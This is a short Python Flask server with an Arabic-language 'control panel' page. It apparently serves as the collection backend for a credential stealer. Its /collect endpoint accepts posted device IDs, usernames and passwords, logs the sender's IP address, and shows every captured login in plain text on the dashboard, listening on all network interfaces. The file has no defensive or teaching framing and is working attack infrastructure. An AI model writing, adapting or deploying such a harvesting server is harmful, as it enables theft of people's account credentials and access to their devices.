from flask import Flask, request, jsonify

app = Flask(__name__)

devices = {}

@app.route('/')
def home():
    html = '<html dir="rtl"><head><meta charset="UTF-8"><title>لوحة التحكم</title><style>body{background:#000;color:#0f0;font-family:monospace;padding:20px}h1{border-bottom:2px solid #0f0}</style></head><body><h1>📱 لوحة التحكم</h1><button onclick="location.reload()" style="background:#0f0;color:#000;padding:10px;border:none;border-radius:5px;font-weight:bold;cursor:pointer">🔄 تحديث</button><hr>'
    for id, d in devices.items():
        html += f'<p>📱 {id[:10]} | 🌐 {d.get("ip","?")} | 🔑 {d.get("username","?")} | 🔐 {d.get("password","?")} | ⏰ {d.get("time","?")}</p>'
    html += '</body></html>'
    return html

@app.route('/collect', methods=['GET', 'POST'])
def collect():
    data = request.get_json(silent=True) or request.form or {}
    id = data.get('id', 'unknown')
    devices[id] = {
        'ip': request.remote_addr,
        'username': data.get('username', '?'),
        'password': data.get('password', '?'),
        'time': data.get('time', '?')
    }
    return jsonify({'ok': True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
